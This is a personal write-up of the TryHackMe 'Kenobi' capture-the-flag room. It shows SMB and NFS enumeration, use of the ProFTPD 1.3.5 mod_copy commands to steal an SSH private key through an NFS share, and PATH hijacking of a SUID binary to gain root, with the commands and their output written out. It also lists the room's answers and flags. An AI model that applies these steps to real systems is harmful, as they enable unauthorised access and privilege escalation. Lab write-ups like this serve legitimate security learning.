# Kenobi

Michael Bailey | 7/18/2021

A CTF that's in the CompTIA Pentest+ path. I'm not following that path, but it put this room after the two Network Services rooms, so I figured it would be good to see how some of those things would be used!

## General Steps / Command History

<small>Certain commands will be clickable, will have results mapped to a log file</small>

---

First, save the IP then find the open ports

---

`export thm_ip=10.10.225.136`

[`nmap -sC -sV $thm_ip`](./nmap_init.log)

<small><b><em>Q1 / Q4 ANSWERED</em></b></small>

Open Ports:

- 21 (ftp)
- 22 (ssh)
- 80 (http)
- 111 (rpcbind/nfs)
- 139/445 (smb)
- 2049 (nfs)

---

This room is focused in particular on SMB/Samba and other network services, but I looked around port 80 first. It's only this picture

![star wars obi wan and anikan fight from the Episode 3](./image.jpg)

I could try to see if something is hidden in it, but I think that's outside the scope of this room

Difference in SMB:

- Port 139 was for when SMB originally ran on top of NetBIOS, which is an older transport layer that allowed Windows PCs to talk to each other on the same network
- Port 445 was opened later on to allow SMB to communicate over the internet

The room suggests I enumerate SMB by making use of some nmap scripts. [I looked around](https://nmap.org/nsedoc/) and found several enum scripts for SMB, though it seems like the ones we can start with is the shares and the users which have access

---

[`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $thm_ip`](./nmap_smb_enum.log)

<small><b><em>Q2 ANSWERED</em></b></small>

---

The scan came back with an anonymous share which is under `C:\home\kenobi\share`. Good! We can try to login with it.

---

```
$ smbclient //$thm_ip/anonymous
Enter WORKGROUP\kali's password:
```

I pressed enter for no password since it's anonymous

```
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877100 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (9.9 KiloBytes/sec) (average 9.9 KiloBytes/sec)
```

<small><b><em>Q3 ANSWERED</em></b></small>

I renamed and took a look at the [log file](./smb_anon_file.txt)

---

In the file, it looks like the `kenobi` user has a private SSH key, which we'll most likely need to get the flag. We can also see a config for a type of FTP server. That might be a good place to start. NFS is also enabled based on what we saw with the open ports, so that might work as well.

Since FTP will be kinda hard to access without much, like the key or the password, NFS might be first, since there's some exploits for NFS shares that don't require login info. We can try to find more info there.

The room recommends we enum NFS on the machine also using nmap scripts, which I can see from the same spot as the earlier run for SMB. We can try to use these scripts to list out shares/files/etc. that NFS has open

---

[`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $thm_ip`](./nmap_enum_nfs.log)

---

<small><b><em>Q5 ANSWERED</em></b></small>

It looks like there is a `/var` share open on NFS, though no users or anything else came back. It's open, but `/var` usually doesn't have much.

The room seems to move on from that, which makes sense since it seems that there isn't much to help with NFS (yet). It suggests we get the version of the FTP server using `nc` then use `searchsploit` to see if there's anything we can exploit from it.

After searching `nc -h`, it looked like I could just run `nc $thm_ip 21` and it would respond back to me, and since I am, of course, a hacking genius, it did in fact speak back to me, as I commanded!

---

```
$ nc $thm_ip 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.225.136]
```

---

<small><b><em>Q6 ANSWERED</em></b></small>

Now we can run `searchsploit` for this specific version of ProFTPD

---

```json
$ searchsploit proftpd 1.3.5 -j | jq    
{
  "SEARCH": "proftpd 1.3.5",
  "DB_PATH_EXPLOIT": "/usr/share/exploitdb",
  "RESULTS_EXPLOIT": [{
      "Title": "ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)",
      "EDB-ID": "37262",
      "Date": "2015-06-10",
      "Author": "Metasploit",
      "Type": "remote",
      "Platform": "linux",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/37262.rb"
    },
    {
      "Title": "ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)",
      "EDB-ID": "49908",
      "Date": "2021-05-26",
      "Author": "Shellbr3ak",
      "Type": "remote",
      "Platform": "linux",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/49908.py"
    },
    {
      "Title": "ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution",
      "EDB-ID": "36803",
      "Date": "2015-04-21",
      "Author": "R-73eN",
      "Type": "remote",
      "Platform": "linux",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/36803.py"
    },
    {
      "Title": "ProFTPd 1.3.5 - File Copy",
      "EDB-ID": "36742",
      "Date": "2015-04-13",
      "Author": "anonymous",
      "Type": "remote",
      "Platform": "linux",
      "Path": "/usr/share/exploitdb/exploits/linux/remote/36742.txt"
    }
  ],
  "DB_PATH_SHELLCODE": "/usr/share/exploitdb",
  "RESULTS_SHELLCODE": []
}
```

<small>Install <code>jq</code> in kali using <code>sudo apt install jq</code></small>

<small><b><em>Q7 ANSWERED</em></b></small>

---

Looks like we can run some remote code in Metasploit, possibly get root access that way. It also looks like we can copy files...

Woah...ok!

That NFS `/var` share is open, we can copy `kenobi`'s `id_rsa` file into there, then login as them! As my father might say, that's some clean livin' right there!

Let's look at the exploit at `/usr/share/exploitdb/exploits/linux/remote/36742.txt`

---

```
...
Vadim Melihow reported a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
to be used by *unauthenticated clients*:
...
```

---

Nice, so we just need to run CPFR and CPTO to get the `id_rsa` into the `/var` folder

Looks like the reference for ProFTPD says these are the commands:

```
SITE CPFR
This SITE command specifies the source file/directory to use for copying from one place to another directly on the server.

The syntax for SITE CPFR is:

  SITE CPFR source-path


SITE CPTO
This SITE command specifies the destination file/directory to use for copying from one place to another directly on the server.

The syntax for SITE CPTO is:

  SITE CPTO destination-path 

```

So from this, it looks like the following set of commands would work once in there

```
site cpfr /home/kenobi/.ssh/id_rsa
site cpto /var/tmp/id_rsa
```

Ok, let's do it! Deep breaths...

---

```
$ nc $thm_ip 21                                        
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.225.136]
...
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

---

Nice! It should be in there now. Now we just need to mount the NFS `/var` share to our system, them grab the file then unmount.

---

```
sudo mkdir /mnt/kenobiNFS
sudo mount $thm_ip:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo umount /mnt/kenobiNFS
sudo rm -rf /mnt/kenobiNFS
```

---

Ok! We have the file, let's SSH in and hope his key isn't password protected! Fingers crossed...

---

```
└─$ ssh -i id_rsa kenobi@$thm_ip   
The authenticity of host '10.10.225.136 (10.10.225.136)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.225.136' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

<small><b><em>Q8 ANSWERED</em></b></small>

---

We got the first flag! Though, even if `kenobi` is a sudo user, we have no password...

Though, we might be able to see if there are any SUID files laying around, which would let us get root access!

Looking back at my SUID notes, we can exploit NFS by creating or using an existing SUID bit file, which, if root-squashing is disabled, can grant us root access. Looks like that's the plan!

First, let's see if we can just find one to use before making one. The room suggests finding one using a special `find` command.

---

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

```

<small><b><em>Q9 ANSWERED</em></b></small>

---

Ayy! There's some! I looked through these, though one looks like it isn't a normal Linux command: `usr/bin/menu` (I at least didn't have it on my Kali VM)

I ran it and it looked interesting! And `kenobi` was able to run it, so that's good too!

---

```
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Tue, 20 Jul 2021 03:12:30 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:d0:34:99:eb:73  
          inet addr:10.10.225.136  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::d0:34ff:fe99:eb73/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:8591 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8362 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:591909 (591.9 KB)  TX bytes:868078 (868.0 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:234 errors:0 dropped:0 overruns:0 frame:0
          TX packets:234 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:16741 (16.7 KB)  TX bytes:16741 (16.7 KB)

```

<small><b><em>Q10 ANSWERED</em></b></small>

---

Huh, ok... That's... needed.

The room suggests running `strings` on the file. It's PROBABLY a bash script

---

```
$ strings /usr/bin/menu
...
curl -I localhost
uname -r
ifconfig
...
```

---

I didn't see anything obvious at first, but as the room points out, and as I remembered, is that it's not depending on the actual binaries. For example, if I made an `iFconfig` bash script in the path (like `/home/kenobi/bin` which is usual), it would run that, and not the one in `/bin` or wherever else.

---

```
kenobi@kenobi:~$ vi ifconfig

--- IN VI ---

#!/bin/bash
pwd

--- BACK TO SHELL ---

kenobi@kenobi:~$ chmod 777 ifconfig
kenobi@kenobi:~$ mkdir bin
kenobi@kenobi:~$ cd bin
kenobi@kenobi:~$ mv ../ifconfig .
kenobi@kenobi:~$ cd ..
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
/home/kenobi

```

---

AHA! Ok, so if we change one of the commands to something where we can run root or something like that, then we'll be golden.

So this is where I kinda got lost, mostly in how SUID works. 

It just runs things as available for everyone, including root, period. 

Welp, so that means it kinda can run as if we're saying `sudo` then whatever on a normal secure machine.

On mine, when I run `sudo sh` then `id`, I get back that I'm root.

I see! Well, in that case, let's do it!

---

```
kenobi@kenobi:~$ cd bin
kenobi@kenobi:~/bin$ echo /bin/sh > curl
kenobi@kenobi:~/bin$ chmod 777 curl
kenobi@kenobi:~/bin$ cd ..
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

---

Welp, there it is lol.

Let's find the flag!

---

```
# cd /root
# ls
root.txt
# cat root.txt  
177b3cd8562289f37382721c28381f02
```

<small><b><em>Q11 ANSWERED</em></b></small>

---

And we found it! Room done!

## Questions

1. How many open ports? [_7_]
2. How many shares on SMB? [_3_]
3. What file do you see? [`log.txt`]
4. What port is FTP running on? [`21`]
5. What NFS mount do we see? [`/var`]
6. What version of ProFTPD is running? [`1.3.5`]
7. How many exploits are there for the ProFTPd running? [_3_]
   - Don't count the two `Remote Command Execution`'s as separate
8. What is Kenobi's user flag (/home/kenobi/user.txt)? [`d0b0f3f53b6caa532a83915e19224899`]
9. What file looks particularly out of the ordinary? [`/usr/bin/menu`]
10. Run the binary, how many options appear? [_3_]
11. What's the root flag? [`177b3cd8562289f37382721c28381f02`]
